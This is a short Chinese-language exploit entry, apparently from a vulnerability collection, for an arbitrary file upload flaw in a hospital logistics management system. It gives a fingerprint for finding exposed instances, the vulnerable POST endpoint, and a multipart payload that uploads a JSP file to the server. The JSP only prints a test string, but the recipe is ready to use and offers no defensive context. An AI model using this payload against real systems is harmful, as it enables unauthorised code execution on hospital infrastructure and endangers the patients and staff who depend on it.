# 医院一站式后勤管理系统processApkUpload.upload存在任意文件上传漏洞

医院一站式后勤管理系统processApkUpload.upload ｜ 文件上传 ｜ —
- **指纹**：`body="frameworkModuleJob"`
- **请求**：`POST /ajaxinvoke/frameworkModuleJob.processApkUpload.upload HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryFQqYtrIWb8iBxUCx
Content-Disposition: form-data; name="Filedata"; filename="qwe.jsp"
Content-Type: application/octet-stream
<% out.print("hello"); %>
------WebKitFormBoundaryFQqYtrIWb8iBxUCx--
```